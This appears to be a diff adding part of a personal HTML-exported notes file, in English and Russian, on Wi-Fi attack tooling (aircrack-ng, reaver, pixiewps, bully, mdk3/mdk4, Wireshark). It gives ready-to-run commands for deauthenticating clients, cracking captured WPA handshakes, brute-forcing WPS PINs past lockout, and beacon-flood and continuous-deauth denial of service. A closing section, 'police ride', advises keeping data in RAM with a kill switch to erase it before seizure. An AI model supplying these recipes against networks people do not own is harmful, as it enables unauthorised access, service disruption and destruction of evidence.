+<div id="outline-container-orgd65f157" class="outline-4">
+<h4 id="orgd65f157"><span class="section-number-4">25.8.1</span> rules</h4>
+<div class="outline-text-4" id="text-25-8-1">
+<ul class="org-ul">
+<li><a href="https://contest-2010.korelogic.com/rules.html">https://contest-2010.korelogic.com/rules.html</a></li>
+</ul>
+
+
+<ul class="org-ul">
+<li><a href="https://www.willhackforsushi.com/code/cowpatty/4.3/README">https://www.willhackforsushi.com/code/cowpatty/4.3/README</a></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org40f72d2" class="outline-3">
+<h3 id="org40f72d2"><span class="section-number-3">25.9</span> <span class="todo TODO">TODO</span> JtR</h3>
+<div class="outline-text-3" id="text-25-9">
+<p>
+app-crypt/johntheripper-jumbo
+</p>
+</div>
+</div>
+<div id="outline-container-org9ebf5b2" class="outline-3">
+<h3 id="org9ebf5b2"><span class="section-number-3">25.10</span> <a href="https://beta.ivc.no/wiki/index.php/WPA_Attack">https://beta.ivc.no/wiki/index.php/WPA_Attack</a></h3>
+<div class="outline-text-3" id="text-25-10">
+<p>
+<a href="https://www.renderlab.net/projects/WPA-tables/">https://www.renderlab.net/projects/WPA-tables/</a>
+</p>
+</div>
+</div>
+<div id="outline-container-org9d92ad6" class="outline-3">
+<h3 id="org9d92ad6"><span class="section-number-3">25.11</span> <a href="https://kalitut.com/hacking-wifi-using-pmkid-and-aircrack-ng/">https://kalitut.com/hacking-wifi-using-pmkid-and-aircrack-ng/</a></h3>
+<div class="outline-text-3" id="text-25-11">
+<p>
+Захват PMKID with handshake
+</p>
+<ul class="org-ul">
+<li>airodump-ng wlp0s20f0u1 &#x2013;channel 9 -w cap2</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org0065ad6" class="outline-3">
+<h3 id="org0065ad6"><span class="section-number-3">25.12</span> <span class="todo TODO">TODO</span> android <a href="https://github.com/VREMSoftwareDevelopment/WiFiAnalyzer">https://github.com/VREMSoftwareDevelopment/WiFiAnalyzer</a></h3>
+</div>
+<div id="outline-container-org72bddde" class="outline-3">
+<h3 id="org72bddde"><span class="section-number-3">25.13</span> my</h3>
+<div class="outline-text-3" id="text-25-13">
+<p>
+Взлом по словарю
+</p>
+<ul class="org-ul">
+<li>aircrack-ng -w test.dic test.pcap a-PMKID.pcap
+<ul class="org-ul">
+<li>test.dic - passwords list</li>
+<li>test.pcap - full handshake</li>
+<li>a-PMKID.pcap - PMKID not 00000000</li>
+</ul></li>
+</ul>
+
+<p>
+Unauth
+</p>
+<ul class="org-ul">
+<li>start kismet</li>
+<li>get BSSID and client MAC</li>
+<li>aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon
+<ul class="org-ul">
+<li>-a BSSID</li>
+<li>-c client MAC</li>
+</ul></li>
+<li>save PKID and handshake pcap</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-orgcecebca" class="outline-2">
+<h2 id="orgcecebca"><span class="section-number-2">26</span> pixiewps - WPS offline brute force</h2>
+<div class="outline-text-2" id="text-26">
+<p>
+The PIN can later be used to recover the WPA-PSK from the Access Point using a tool like Reaver, Bully or join directly
+the wireless network using wpa<sub>cli</sub> and other programs.
+</p>
+
+<p>
+<a href="https://github.com/t6x/reaver-wps-fork-t6x">https://github.com/t6x/reaver-wps-fork-t6x</a>
+</p>
+<ul class="org-ul">
+<li>require: pixiewps, aircrack-ng</li>
+</ul>
+
+<p>
+usage
+</p>
+<ul class="org-ul">
+<li>wash -w wlan0 -s
+<ul class="org-ul">
+<li>-s - отправлять probe requests (зондирующие запросы) к каждой ТД, это позволит получить больше информации о ТД.</li>
+<li>Для того, чтобы проводить поиск на 5GHz 802.11 каналах используется опция -5.</li>
+</ul></li>
+
+<li>reaver -i wlan0mon -c 13 -b AA:BB:CC:XX:YY:ZZ -vvv -K 1
+<ul class="org-ul">
+<li>reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15</li>
+<li>reaver -i mon0 -d 30 -c 9 -b 00:23:69:48:33:95 -N -S -vv</li>
+<li>-K 1 option performs the offline attack, Pixie Dust, by automatically passing the PKE, PKR, E-Hash1, E-Hash2, E-Nonce
+and Authkey variables.</li>
+<li>-c 13 - channel</li>
+<li>-L Ignore locked WPS state.</li>
+<li>-N Don’t send NACK packets when errors are detected.</li>
+<li>-d 15 Delay 15 seconds between PIN attempts.</li>
+<li>-T Set timeout period to half a second.</li>
+<li>-r 3:15 After 3 attempts, sleep for 15 seconds</li>
+<li>-S - ?</li>
+</ul></li>
+<li>wpa<sub>supplicant</sub> -D nl80211 -i &lt;wireless<sub>interface</sub>&gt; -c /etc/wpa<sub>supplicant.conf</sub> –B</li>
+</ul>
+
+<p>
+reaver good with:
+</p>
+<ul class="org-ul">
+<li>Keenetic-8955, 2.0, Vendor:RalinkTe</li>
+</ul>
+
+<p>
+2012 reaver - wps crack - 10hours
+<a href="https://habr.com/ru/company/xakep/blog/143834/">https://habr.com/ru/company/xakep/blog/143834/</a>
+</p>
+
+<p>
+wpscrack.py - reaver alternative:
+</p>
+<ul class="org-ul">
+<li><a href="https://github.com/kcdtv/wpscrack">https://github.com/kcdtv/wpscrack</a></li>
+</ul>
+</div>
+
+<div id="outline-container-org3efc61c" class="outline-3">
+<h3 id="org3efc61c"><span class="section-number-3">26.1</span> reset router</h3>
+<div class="outline-text-3" id="text-26-1">
+<p>
+<a href="https://en.kali.tools/?p=864">https://en.kali.tools/?p=864</a>
+<a href="https://en.kali.tools/?p=394">https://en.kali.tools/?p=394</a>
+<a href="https://github.com/DanMcInerney/wifijammer">https://github.com/DanMcInerney/wifijammer</a>
+<a href="https://en.kali.tools/?p=90">https://en.kali.tools/?p=90</a>
+<a href="https://packages.gentoo.org/packages/net-wireless/mdk">https://packages.gentoo.org/packages/net-wireless/mdk</a>
+<a href="https://github.com/aircrack-ng/mdk4">https://github.com/aircrack-ng/mdk4</a>
+mdk3 $interface$mon d -b $path -c $ch
+</p>
+
+
+<p>
+This floods the target AP with fake clients.
+</p>
+<ul class="org-ul">
+<li>mdk3 monX a -a xx:xx:xx:xx:xx:xx -m</li>
+</ul>
+
+<p>
+This causes Michael failure, stopping all wireless traffic. However, this only works if the target AP supports TKIP. (Can be AES+TKIP)
+</p>
+<ul class="org-ul">
+<li>mdk3 monX m -t xx:xx:xx:xx:xx:xx</li>
+</ul>
+
+<p>
+This keeps a continuous deauth on the network. If this attack does not start, make a blank text document in your root folder named blacklist. Leave it empty as MDK3 automatically populates the list.
+</p>
+<ul class="org-ul">
+<li>mdk3 monX d -b blacklist -c X</li>
+</ul>
+
+<p>
+This floods a bunch of fake APs to any clients in range (only effective to windows clients and maybe some other devices, Macs are protected against this).
+</p>
+<ul class="org-ul">
+<li>mdk3 monX b -t xx:xx:xx:xx:xx:xx -c X</li>
+</ul>
+
+<p>
+You will know when the AP has reset either by checking with
+</p>
+<ul class="org-ul">
+<li>wash -i monX -C</li>
+</ul>
+
+
+<p>
+ you should have a total of 5 windows open at the same time:
+ 1- airodump
+2- mdk3 a
+3- mdk3 b
+4- mdk3 d
+5- mdk3 m
+</p>
+
+
+<p>
+I generally like to use:
+mdk3 monX -a 00:11:22:33:44:55 -m
+mdk3 monX d -b blacklist -c X
+mdk3 monX b -t 00:11:22:33:44:55 -c X
+</p>
+
+<p>
+WPA-TKIP then also include:
+mdk3 monX m -t 00:11:22:33:44:55
+</p>
+</div>
+</div>
+<div id="outline-container-orgee9af42" class="outline-3">
+<h3 id="orgee9af42"><span class="section-number-3">26.2</span> links</h3>
+<div class="outline-text-3" id="text-26-2">
+<ul class="org-ul">
+<li>pixiewps <a href="https://github.com/wiire-a/pixiewps">https://github.com/wiire-a/pixiewps</a>
+<ul class="org-ul">
+<li>pixiewps - WPS PIN exploiting the low or non-existing entropy of some software implementations
+<ul class="org-ul">
+<li>seconds or minutes, depending on the target, if vulnerable.</li>
+</ul></li>
+<li>pixie-dust attack</li>
+<li><a href="https://github.com/wiire-a/pixiewps/wiki">https://github.com/wiire-a/pixiewps/wiki</a></li>
+<li><a href="https://forums.kali.org/showthread.php?25018-Pixiewps-wps-pixie-dust-attack-tool">https://forums.kali.org/showthread.php?25018-Pixiewps-wps-pixie-dust-attack-tool</a></li>
+<li><a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack">https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack</a>-(Offline-WPS-Attack)</li>
+<li><a href="https://opensourcelibs.com/lib/pixiewps">https://opensourcelibs.com/lib/pixiewps</a></li>
+<li><a href="https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/">https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/</a></li>
+</ul></li>
+<li>WPS brute force <a href="https://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/">https://sviehb.wordpress.com/2011/12/27/wi-fi-protected-setup-pin-brute-force-vulnerability/</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org24f1480" class="outline-3">
+<h3 id="org24f1480"><span class="section-number-3">26.3</span> bully online WPS</h3>
+<div class="outline-text-3" id="text-26-3">
+<p>
+Reaver was going in ascending order for generating the pins and Bully always got a random pin. gets early while guessing
+randomly
+</p>
+
+<p>
+bully -b 00:23:69:48:33:95
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orge92beaa" class="outline-2">
+<h2 id="orge92beaa"><span class="section-number-2">27</span> net-wireless/aircrack-ng</h2>
+<div class="outline-text-2" id="text-27">
+<p>
+Kicking Off a Client - you must be close
+</p>
+<ul class="org-ul">
+<li>check devices &lt;prefix&gt;.kismet.netxml</li>
+<li>aireplay-ng -0 1 -a &lt;mac of AP&gt; -c &lt;mac of client&gt; wlan0mon # send DEAUTH packet</li>
+<li>They will probably try to automatically reconnect. This gives us the handshake we're after.</li>
+<li>aireplay-ng command will let you know how many ACKs (acknowledgements of your packets) were received</li>
+<li>If you get no acknowledgements, you're probably too far away from the network and need to get physically closer.</li>
+</ul>
+
+<p>
+WPA2:
+</p>
+<ul class="org-ul">
+<li>airomon-ng start wlan0</li>
+<li>airodump-ng -c 9 &#x2013;bssid 00:14:6C:7E:40:80 -w psk wlan0</li>
+<li>turn off hope in kissmet</li>
+<li>aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0</li>
+<li><p>
+aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+</p>
+
+<p>
+Experiment with using coWPAtty’s rainbow table attack,
+  genpmk -f &lt;wordlist&gt; -d &lt;output filename&gt; -s &lt;ESSID&gt;
+  cowpatty -r &lt;capture&gt; -d &lt;hashes filename&gt; -s &lt;ESSID&gt;
+</p></li>
+</ul>
+</div>
+
+<div id="outline-container-org6c2cbb8" class="outline-3">
+<h3 id="org6c2cbb8"><span class="section-number-3">27.1</span> suite components</h3>
+<div class="outline-text-3" id="text-27-1">
+<ul class="org-ul">
+<li>airbase-ng - WEP, WPA, AP mode, send/encrypt packages</li>
+<li>aircrack-ng -</li>
+<li>airdecap-ng - decrypt WEP/WPA/WPA2 capture files</li>
+<li>airdecloak-ng - WEP - remove clocking</li>
+<li>airdrop-ng - deauthentication of users</li>
+<li>aireplay-ng - WPA2  deauthentications attacks</li>
+<li>airgraph-ng - Client to AP Relationship, all probed SSID by clients</li>
+<li>airmon-ng - start monitor mode</li>
+<li>airodump-ng</li>
+<li>airolib-ng</li>
+<li>airserv-ng</li>
+<li>airtun-ng</li>
+<li>besside-ng</li>
+<li>dcrack</li>
+<li>easside-ng</li>
+<li>packetforge-ng</li>
+<li>tkiptun-ng</li>
+<li>wesside-ng</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org9949816" class="outline-3">
+<h3 id="org9949816"><span class="section-number-3">27.2</span> airbase</h3>
+<div class="outline-text-3" id="text-27-2">
+<p>
+fake AP
+</p>
+</div>
+<div id="outline-container-orgf8a1552" class="outline-4">
+<h4 id="orgf8a1552"><span class="section-number-4">27.2.1</span> features</h4>
+<div class="outline-text-4" id="text-27-2-1">
+<ul class="org-ul">
+<li>Implements the Caffe Latte WEP client attack</li>
+<li>Implements the Hirte WEP client attack</li>
+<li>Ability to cause the WPA/WPA2 handshake to be captured</li>
+<li>Ability to act as an ad-hoc Access Point</li>
+<li>Ability to act as a full Access Point</li>
+<li>Ability to filter by SSID or client MAC addresses</li>
+<li>Ability to manipulate and resend packets</li>
+<li>Ability to encrypt sent packets and decrypt received packets</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5680e03" class="outline-3">
+<h3 id="org5680e03"><span class="section-number-3">27.3</span> airmon</h3>
+<div class="outline-text-3" id="text-27-3">
+<p>
+monitor mode
+</p>
+<ul class="org-ul">
+<li>airmon-ng check</li>
+<li>airmon-ng check kill</li>
+<li>airmon-ng start wlan0 1</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org5b54cc1" class="outline-3">
+<h3 id="org5b54cc1"><span class="section-number-3">27.4</span> airodump</h3>
+<div class="outline-text-3" id="text-27-4">
+<p>
+packet capture - raw 802.11 frames
+</p>
+<ul class="org-ul">
+<li>airodump-ng -c &lt;channel&gt; &#x2013;bssid &lt;mac of AP&gt; -w file<sub>prefix</sub> &lt;interface&gt;</li>
+</ul>
+</div>
+<div id="outline-container-org492fd18" class="outline-4">
+<h4 id="org492fd18"><span class="section-number-4">27.4.1</span> default:</h4>
+<div class="outline-text-4" id="text-27-4-1">
+<ul class="org-ul">
+<li>hops on all 2.4GHz channels</li>
+<li>record only 1 beacon for each network</li>
+<li>output in pcam, csv, kismet, kismet-newcore</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orga7c059e" class="outline-4">
+<h4 id="orga7c059e"><span class="section-number-4">27.4.2</span> output</h4>
+<div class="outline-text-4" id="text-27-4-2">
+<ul class="org-ul">
+<li>PWR - power</li>
+<li>RXQ Receive Quality as measured by the percentage of packets (management and data frames)
+successfully received over the last 10 seconds</li>
+<li>Beacons - Number of announcements from AP</li>
+<li># Data	Number of captured data packets</li>
+<li>#/s	Number of data packets per second measure over the last 10 seconds.</li>
+<li>CH	Channel number</li>
+<li>MB Maximum speed supported by the AP. If MB = 11, it's 802.11b, if MB = 22 it's 802.11b+ and up to
+54 are 802.11g. Anything higher is 802.11n or 802.11ac.The dot (after 54 above) indicates short
+preamble is supported. Displays “e” following the MB speed value if the network has QoS enabled.</li>
+<li>ENC - Encryption algorithm in use. OPN = no encryption</li>
+<li>AUTH
+<ul class="org-ul">
+<li>MGT (WPA/WPA2 using a separate authentication server)</li>
+<li>SKA (shared key for WEP)</li>
+<li>PSK (pre-shared key for WPA/WPA2)</li>
+<li>OPN (open for WEP).</li>
+</ul></li>
+<li>STATION - MAC address of each associated station or stations searching for an AP to connect
+with. Clients not currently associated with an AP have a BSSID of “(not associated)”.</li>
+<li>Rate	Station's receive rate, followed by transmit rate. Displays “e” following each rate if the network has QoS enabled.</li>
+<li>Lost - The number of data packets lost over the last 10 seconds based on the sequence number.</li>
+<li></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org16c63f6" class="outline-3">
+<h3 id="org16c63f6"><span class="section-number-3">27.5</span> aireplay-ng</h3>
+<div class="outline-text-3" id="text-27-5">
+<ul class="org-ul">
+<li>aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+<ul class="org-ul">
+<li>-0 means deauthentication</li>
+<li>1 is the number of deauths to send (you can send multiple if you wish)</li>
+<li>-a 00:14:6C:7E:40:80 is the MAC address of the access point</li>
+<li>-c 00:0F:B5:FD:FB:C2 is the MAC address of the client you are deauthing</li>
+<li>ath0 is the interface name</li>
+</ul></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org39191be" class="outline-3">
+<h3 id="org39191be"><span class="section-number-3">27.6</span> airgraph-ng</h3>
+<div class="outline-text-3" id="text-27-6">
+<ul class="org-ul">
+<li>emerge media-gfx/graphviz</li>
+</ul>
+<p>
+usage
+</p>
+<ol class="org-ol">
+<li>airodump-ng wlan0mon -w /root/Desktop/test</li>
+<li>airmon-ng stop wlan0mon</li>
+<li>airgraph-ng -i test-01.csv -o airgraph-test -g CARP</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-org721b5e5" class="outline-3">
+<h3 id="org721b5e5"><span class="section-number-3">27.7</span> links</h3>
+<div class="outline-text-3" id="text-27-7">
+<ul class="org-ul">
+<li><a href="https://wiki.installgentoo.com/wiki/Breaking_WPA2">https://wiki.installgentoo.com/wiki/Breaking_WPA2</a></li>
+<li><a href="https://www.aircrack-ng.org/doku.php?id=tutorial">https://www.aircrack-ng.org/doku.php?id=tutorial</a></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgdbc2b86" class="outline-2">
+<h2 id="orgdbc2b86"><span class="section-number-2">28</span> mdk5</h2>
+<div class="outline-text-2" id="text-28">
+<p>
+sudo mdk4 wlo1 b -a -m -s 500
+</p>
+<ul class="org-ul">
+<li>b: Beacon Flooding</li>
+</ul>
+
+
+<ul class="org-ul">
+<li>-a Use also non-printable caracters in generated SSIDs  and create SSIDs that break the 32-byte limit</li>
+<li>-s &lt;pps&gt;  Set speed in packets per second (Default: 50)</li>
+</ul>
+
+<p>
+mdk4 wlan0 d -c 2
+</p>
+<ul class="org-ul">
+<li>d: Deauthentication and Disassociation</li>
+</ul>
+
+
+<p>
+ATTACK MODE d: Deauthentication and Disassociation - Sends deauthentication and disassociation packets to stations based
+  on data traffic to disconnect all clients from an AP.
+</p>
+<ul class="org-ul">
+<li>-w &lt;filename&gt;  Read file containing MACs not to care about (Whitelist mode)</li>
+<li>-b &lt;filename&gt; Read file containing MACs to run test on (Blacklist Mode)</li>
+<li>-s &lt;pps&gt; Set speed in packets per second (Default: unlimited)</li>
+<li>-x  Enable full IDS stealth by matching all Sequence Numbers  Packets will only be sent with clients' addresses</li>
+<li>-c [chan,chan,&#x2026;,chan[:speed]] Enable channel hopping. When -c h is given, mdk4 will hop an all 14 b/g
+channels. Channel will be changed every 3 seconds, if speed is not specified. Speed value is in milliseconds!</li>
+<li>-E &lt;AP ESSID&gt; Specify an AP ESSID to attack.</li>
+<li>-B &lt;AP BSSID&gt; Specify an AP BSSID to attack.</li>
+<li>-S &lt;Station MAC address&gt; Specify a station MAC address to attack.</li>
+</ul>
+
+
+
+<p>
+ATTACK MODE m: Michael Countermeasures Exploitation
+  Sends random packets or re-injects duplicates on another QoS queue
+  to provoke Michael Countermeasures on TKIP APs.
+  AP will then shutdown for a whole minute, making this an effective DoS.
+      -t &lt;bssid&gt;
+         Set target AP, that runs TKIP encryption
+      -j
+         Use the new QoS exploit which only needs to reinject a few packets instead
+         of the random packet injection, which is unreliable but works without QoS.
+      -s &lt;pps&gt;
+         Set speed in packets per second (Default: 400)
+      -w &lt;seconds&gt;
+         Wait &lt;seconds&gt; between each random packet burst (Default: 10)
+      -n &lt;count&gt;
+         Send &lt;count&gt; random packets per burst (Default: 70)
+</p>
+
+
+<p>
+ATTACK MODE f: Packet Fuzzer
+  A simple packet fuzzer with multiple packet sources
+  and a nice set of modifiers. Be careful!
+  mdk4 randomly selects the given sources and one or multiple modifiers.
+      -s &lt;sources&gt;
+         Specify one or more of the following packet sources:
+         a - Sniff packets from the air
+         b - Create valid beacon frames with random SSIDs and properties
+         c - Create CTS frames to broadcast (you can also use this for a CTS DoS)
+         p - Create broadcast probe requests
+      -m &lt;modifiers&gt;
+         Select at least one of the modifiers here:
+         n - No modifier, do not modify packets
+         b - Set destination address to broadcast
+         m - Set source address to broadcast
+         s - Shotgun: randomly overwrites a couple of bytes
+         t - append random bytes (creates broken tagged parameters in beacons/probes)
+         c - Cut packets short, preferably somewhere in headers or tags
+         d - Insert random values in Duration and Flags fields
+      -c [chan,chan,&#x2026;,chan[:speed]]
+         Enable channel hopping. When -c h is given, mdk4 will hop an all
+         14 b/g channels. Channel will be changed every 3 seconds,
+         if speed is not specified. Speed value is in milliseconds!
+      -p &lt;pps&gt;
+         Set speed in packets per second (Default: 250)
+</p>
+</div>
+</div>
+
+<div id="outline-container-org514d1d9" class="outline-2">
+<h2 id="org514d1d9"><span class="section-number-2">29</span> wireshark</h2>
+<div class="outline-text-2" id="text-29">
+<ul class="org-ul">
+<li>tshark -r example.pcap not icmp - dump</li>
+<li>capinfos example.pcap - info about file</li>
+</ul>
+</div>
+<div id="outline-container-orgfe1510b" class="outline-3">
+<h3 id="orgfe1510b"><span class="section-number-3">29.1</span> filters wifi</h3>
+<div class="outline-text-3" id="text-29-1">
+<ul class="org-ul">
+<li>wlan.fc.type==0 and wlan.fc.subtype==8 - beacon</li>
+<li>wlan.fc.type==0 and wlan.fc.subtype==4 - Probe request</li>
+<li>wlan.fc.type==0 and wlan.fc.subtype==5 - Probe response</li>
+<li>wlan.fc.type==1 and wlan.fc.subtype==13 - Acknowledgement</li>
+<li>wlan.fc.type==1 and wlan.fc.subtype==11 - RTS ready to send</li>
+<li>wlan.fc.type==1 and wlan.fc.subtype==12 - CTS Clear to send</li>
+<li>wlan.fc.addr - client MAC</li>
+<li>wlan.fc.ta - transmitter MAC</li>
+<li>wlan.fc.ra - receiver MAC</li>
+<li>wlan.fc.sa - source MAC</li>
+<li>wlan.fc.da - destination MAC</li>
+<li>wlan.bssid - BSSID MAC</li>
+<li>wlan<sub>mgt.ssid</sub> == "SSID here"</li>
+
+<li>radiotap.channel.freq == 5240 - frequency</li>
+<li>radiotap.datarate &lt;= 6 - filter by data rate in Mbps</li>
+<li>radiotap.dbm<sub>antsignal</sub> &gt;= -60 - filter by signal strength in dBm</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org89245d8" class="outline-3">
+<h3 id="org89245d8"><span class="section-number-3">29.2</span> install</h3>
+<div class="outline-text-3" id="text-29-2">
+<ul class="org-ul">
+<li>emerge &#x2013;ask net-analyzer/wireshark</li>
+<li>gpasswd -a $USER pcap</li>
+<li>gui require USE=qt5</li>
+</ul>
+
+
+<p>
+Edit -&gt; Preference:
+</p>
+<ul class="org-ul">
+<li>Name Resolution -&gt; Use an external network name resolver</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org8099c41" class="outline-3">
+<h3 id="org8099c41"><span class="section-number-3">29.3</span> tools</h3>
+<div class="outline-text-3" id="text-29-3">
+<ul class="org-ul">
+<li>tshark - Dump and analyze network traffic</li>
+<li>capinfos - Prints information about capture files</li>
+<li>captype - Prints the types of capture files</li>
+<li>dumpcap - Dump network traffic</li>
+<li>editcap - Edit and/or translate the format of capture files</li>
+<li>idl2wrs - CORBA IDL to Wireshark Plugin Generator</li>
+<li>mergecap - Merges two or more capture files into one</li>
+<li>randpkt - Random packet generator</li>
+<li>rawshark - Dump and analyze raw pcap data</li>
+<li>reordercap - Reorder input file by timestamp into output file</li>
+<li>sharkd - ??</li>
+<li>text2pcap - Generate a capture file from an ASCII hexdump of packets</li>
+<li></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orga1d3cd9" class="outline-3">
+<h3 id="orga1d3cd9"><span class="section-number-3">29.4</span> flags</h3>
+<div class="outline-text-3" id="text-29-4">
+<ul class="org-ul">
+<li>&lt;flag name="androiddump"&gt;Install androiddump, an extcap interface to capture from Android devices&lt;/flag&gt;</li>
+<li>&lt;flag name="bcg729"&gt;Use &lt;pkg&gt;media-libs/bcg729&lt;/pkg&gt; for G.729 codec support in RTP Player&lt;/flag&gt;</li>
+<li>&lt;flag name="brotli"&gt;Use &lt;pkg&gt;app-arch/brotli&lt;/pkg&gt; for compression/decompression&lt;/flag&gt;</li>
+<li>&lt;flag name="capinfos"&gt;Install capinfos, to print information about capture files&lt;/flag&gt;</li>
+<li>&lt;flag name="captype"&gt;Install captype, to print the file types of capture files&lt;/flag&gt;</li>
+<li>&lt;flag name="ciscodump"&gt;Install ciscodump, extcap interface to capture from a remote Cisco router&lt;/flag&gt;</li>
+<li>&lt;flag name="dftest"&gt;Install dftest, to display filter byte-code, for debugging dfilter routines&lt;/flag&gt;</li>
+<li>&lt;flag name="dpauxmon"&gt;Install dpauxmon, an external capture interface (extcap) that captures DisplayPort AUX channel data from linux kernel drivers&lt;/flag&gt;</li>
+<li>&lt;flag name="dumpcap"&gt;Install dumpcap, to dump network traffic from inside wireshark&lt;/flag&gt;</li>
+<li>&lt;flag name="editcap"&gt;Install editcap, to edit and/or translate the format of capture files&lt;/flag&gt;</li>
+<li>&lt;flag name="http2"&gt;Use &lt;pkg&gt;net-libs/nghttp2&lt;/pkg&gt; for HTTP/2 support&lt;/flag&gt;</li>
+<li>&lt;flag name="ilbc"&gt;Build with iLBC support in RTP Player using &lt;pkg&gt;media-libs/libilbc&lt;/pkg&gt;&lt;/flag&gt;</li>
+<li>&lt;flag name="libxml2"&gt;Use &lt;pkg&gt;dev-libs/libxml2&lt;/pkg&gt; for handling XML configuration in dissectors&lt;/flag&gt;</li>
+<li>&lt;flag name="lto"&gt;Enable link time optimization&lt;/flag&gt;</li>
+<li>&lt;flag name="maxminddb"&gt;Use &lt;pkg&gt;dev-libs/libmaxminddb&lt;/pkg&gt; for IP address geolocation&lt;/flag&gt;</li>
+<li>&lt;flag name="mergecap"&gt;Install mergecap, to merge two or more capture files into one&lt;/flag&gt;</li>
+<li>&lt;flag name="minizip"&gt;Build with zip file compression support&lt;/flag&gt;</li>
+<li>&lt;flag name="netlink"&gt;Use &lt;pkg&gt;dev-libs/libnl&lt;/pkg&gt;&lt;/flag&gt;</li>
+<li>&lt;flag name="pcap"&gt;Use &lt;pkg&gt;net-libs/libpcap&lt;/pkg&gt; for network packet capturing (build dumpcap, rawshark)&lt;/flag&gt;</li>
+<li>&lt;flag name="plugin-ifdemo"&gt;Install plugin interface demo&lt;/flag&gt;</li>
+<li>&lt;flag name="plugins"&gt;Install plugins&lt;/flag&gt;</li>
+<li>&lt;flag name="randpkt"&gt;Install randpkt, a utility for creating pcap trace files full of random packets&lt;/flag&gt;</li>
+<li>&lt;flag name="randpktdump"&gt;Install randpktdump, an extcap interface to provide access to the random packet generator (randpkt)&lt;/flag&gt;</li>
+<li>&lt;flag name="reordercap"&gt;Install reordercap, to reorder input file by timestamp into output file&lt;/flag&gt;</li>
+<li>&lt;flag name="sbc"&gt;Use &lt;pkg&gt;media-libs/sbc&lt;/pkg&gt; for playing back SBC encoded packets&lt;/flag&gt;</li>
+<li>&lt;flag name="sdjournal"&gt;Install sdjournal, an extcap that captures systemd journal entries&lt;/flag&gt;</li>
+<li>&lt;flag name="sharkd"&gt;Install sharkd, the daemon variant of wireshark&lt;/flag&gt;</li>
+<li>&lt;flag name="smi"&gt;Use &lt;pkg&gt;net-libs/libsmi&lt;/pkg&gt; to resolve numeric OIDs into human readable format&lt;/flag&gt;</li>
+<li>&lt;flag name="spandsp"&gt;Use &lt;pkg&gt;media-libs/spandsp&lt;/pkg&gt; for for G.722 and G.726 codec support in the RTP Player&lt;/flag&gt;</li>
+<li>&lt;flag name="sshdump"&gt;Install sshdump, an extcap interface to capture from a remote host through SSH&lt;/flag&gt;</li>
+<li>&lt;flag name="text2pcap"&gt;Install text2pcap, to generate a capture file from an ASCII hexdump of packets&lt;/flag&gt;</li>
+<li>&lt;flag name="tfshark"&gt;Install tfshark, a terminal-based version of the FileShark capability&lt;/flag&gt;</li>
+<li>&lt;flag name="tshark"&gt;Install tshark, to dump and analyzer network traffic from the command line&lt;/flag&gt;</li>
+<li>&lt;flag name="udpdump"&gt;Install udpdump, to get packets exported from a source (like a network device or a GSMTAP producer) that are dumped to a pcap file&lt;/flag&gt;</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org2fcdabd" class="outline-3">
+<h3 id="org2fcdabd"><span class="section-number-3">29.5</span> decrypt WPA2 frames</h3>
+<div class="outline-text-3" id="text-29-5">
+<ul class="org-ul">
+<li><a href="https://mrncciew.com/2014/08/16/decrypt-wpa2-psk-using-wireshark/">https://mrncciew.com/2014/08/16/decrypt-wpa2-psk-using-wireshark/</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgcac7dd4" class="outline-3">
+<h3 id="orgcac7dd4"><span class="section-number-3">29.6</span> extract PMKID</h3>
+<div class="outline-text-3" id="text-29-6">
+<ol class="org-ol">
+<li>message: EAPOL protocl</li>
+<li>Authentication</li>
+<li>WPA Key Data</li>
+<li>Tag: Vendor Specific</li>
+<li>PMKID</li>
+</ol>
+</div>
+</div>
+</div>
+<div id="outline-container-org5a09666" class="outline-2">
+<h2 id="org5a09666"><span class="section-number-2">30</span> python scapy - forge or decode packets</h2>
+<div class="outline-text-2" id="text-30">
+<ul class="org-ul">
+<li><a href="https://scapy.readthedocs.io/en/latest/api/scapy.layers.html">https://scapy.readthedocs.io/en/latest/api/scapy.layers.html</a></li>
+</ul>
+<p>
+<a href="https://pypi.org/project/scapy/">https://pypi.org/project/scapy/</a>
+</p>
+</div>
+</div>
+<div id="outline-container-org285d210" class="outline-2">
+<h2 id="org285d210"><span class="section-number-2">31</span> police ride</h2>
+<div class="outline-text-2" id="text-31">
+</div>
+<div id="outline-container-org691dfdc" class="outline-3">
+<h3 id="org691dfdc"><span class="section-number-3">31.1</span> 1</h3>
+<div class="outline-text-3" id="text-31-1">
+<p>
+Just store everything on random access memory and a backed up power supply with a kill switch.
+</p>
+
+<p>
+It takes 10 seconds without power to erase random access memory.
+</p>
+
+<p>
+If you need to turn off power for a while, you can transfer stuff from RAM to a hard drive, reboot, then transfer it back to ram and wipe the drives.
+</p>
+
+<p>
+There's already a kill power program to kill power if there's an undetected USB port connection I think.
+</p>
+
+<p>
